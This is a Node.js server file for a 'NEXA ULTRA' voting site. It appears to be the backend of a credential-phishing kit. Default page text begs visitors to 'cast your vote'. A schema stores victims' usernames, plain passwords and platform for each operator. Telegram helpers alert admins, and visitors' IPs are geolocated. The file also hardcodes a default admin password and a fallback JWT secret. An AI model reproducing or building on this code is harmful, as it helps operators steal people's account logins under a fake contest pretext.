// server.js — NEXA ULTRA (Telegram Integrated)
require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const multer = require("multer");
const jwt = require("jsonwebtoken");
const axios = require("axios");
const bcrypt = require("bcryptjs");
const { v2: cloudinary } = require("cloudinary");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ---------- CONFIG ----------
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || "nexa_secret_key";
const CLOUDINARY_FOLDER = process.env.CLOUDINARY_FOLDER || "nexa_mini";
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const DEFAULT_AVATAR_URL = process.env.DEFAULT_AVATAR_URL || "";

// ---------- MONGO ----------
mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => {
    console.log("✅ MongoDB connected");
    ensureDefaultAdmin();
  })
  .catch((err) => console.error("❌ MongoDB connection failed:", err.message));

// ---------- CLOUDINARY ----------
cloudinary.config({
  cloud_name: process.env.CLOUDINARY_NAME || "",
  api_key: process.env.CLOUDINARY_KEY || "",
  api_secret: process.env.CLOUDINARY_SECRET || "",
});

// ---------- MULTER ----------
const upload = multer({ storage: multer.memoryStorage() });

// ---------- MODELS ----------
const AdminSchema = new mongoose.Schema({
  username: { type: String, unique: true, sparse: true },
  firstname: String,
  lastname: String,
  phone: { type: String, unique: true, sparse: true },
  password: String,
  avatar: String,
  referralCode: String,
  chatId: String, // 🔹 replaced apikey with chatId
  bio: String,
  slogan: String,
  votes: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});
const SettingsSchema = new mongoose.Schema({
  title: { type: String, default: "The People's pick" },
  subTitle: { type: String, default: "Vote us 2025🎉🎊🎉🎊" },
  description: {
    type: String,
    default: "I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. <strong>Your vote</strong> could be the difference-maker, propelling me toward victory"
  },
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" }
});

const Site = mongoose.model("Site", SettingsSchema);
const Admin = mongoose.model("Admin", AdminSchema);

const StudentSchema = new mongoose.Schema({
  username: String,
  password: String,
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: String,
  referrer: String,
  platform: String,
  createdAt: { type: Date, default: Date.now }
});
const Student = mongoose.model("Student", StudentSchema);

const ReferralSchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  code: String,
  createdAt: { type: Date, default: Date.now }
});
const Referral = mongoose.model("Referral", ReferralSchema);

const ActivitySchema = new mongoose.Schema({
  adminId: { type: mongoose.Schema.Types.ObjectId, ref: "Admin" },
  studentId: { type: mongoose.Schema.Types.ObjectId, ref: "Student" },
  action: String,
  details: { type: mongoose.Schema.Types.Mixed, default: {} },
  createdAt: { type: Date, default: Date.now }
});
const Activity = mongoose.model("Activity", ActivitySchema);

// ---------- HELPERS ----------
function formatPhone(phone) {
  if (!phone) return "";

  const digits = phone.toString().replace(/\D/g, "");
  const localPart = digits.slice(-10);

  if (localPart.length !== 10) throw new Error("Invalid phone number");

  return "234" + localPart;
}

async function hashPassword(pw) {
  return bcrypt.hash(pw, 10);
}

function generateCode(len = 8) {
  return Math.random().toString(36).substring(2, 2 + len);
}

async function generateUniqueUsername(fn = "user", ln = "nexa") {
  const base = (fn + ln).toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 8);
  for (let i = 0; i < 6; i++) {
    const name = `${base}${Math.floor(1000 + Math.random() * 9000)}`;
    if (!(await Admin.findOne({ username: name }))) return name;
  }
  return base + Date.now();
}

// 🔹 Send Telegram Message (replaces WhatsApp)
async function sendTelegram(chatId, text) {
  try {
    if (!BOT_TOKEN) throw new Error("Missing BOT_TOKEN");
    const finalChat = chatId || ADMIN_CHAT_ID;
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: finalChat,
      text,
      parse_mode: "Markdown"
    });
    console.log(`📨 Telegram sent to ${finalChat}`);
  } catch (err) {
    console.error("Telegram failed:", err.message);
  }
}

async function sendToAdmin(adminId, msg) {
  try {
    const a = await Admin.findById(adminId).lean();
    if (!a) {
      console.warn("sendToAdmin: admin not found", adminId);
      return;
    }
    const chatId = a.chatId || ADMIN_CHAT_ID;
    await sendTelegram(chatId, msg);
  } catch (err) {
    console.error("sendToAdmin error:", err.message || err);
  }
}

async function getLocation(ip) {
  try {
    const clean = (ip || "").split(",")[0].trim();
    const { data } = await axios.get(`https://ipapi.co/${clean}/json/`);
    return { city: data.city, region: data.region, country: data.country_name };
  } catch (err) {
    console.warn("getLocation failed:", err && err.message);
    return {};
  }
}

const verifyToken = (req, res, next) => {
  try {
    const token = req.headers.authorization?.split(" ")[1];
    if (!token) return res.status(401).json({ success: false, error: "No token" });
    req.userId = jwt.verify(token, JWT_SECRET).id;
    next();
  } catch (err) {
    return res.status(403).json({ success: false, error: "Invalid token" });
  }
};

// ---------- BOOTSTRAP ----------
async function ensureDefaultAdmin() {
  try {
    const c = await Admin.countDocuments();
    if (c > 0) return;
    const username = "nexa_admin";
    const phone = formatPhone(process.env.DEFAULT_ADMIN_PHONE || "09122154145");
    const password = await hashPassword("024486");
    const referralCode = "seed_" + Date.now();
    const a = await Admin.create({
      username,
      firstname: "Nexa",
      lastname: "Admin",
      phone,
      password,
      referralCode,
      avatar: DEFAULT_AVATAR_URL,
      chatId: ADMIN_CHAT_ID // 🔹 your Telegram chatId
    });
    await Referral.create({ adminId: a._id, code: referralCode });
    console.log("✅ Default admin created:", username);
  } catch (err) {
    console.error("ensureDefaultAdmin failed:", err);
  }
}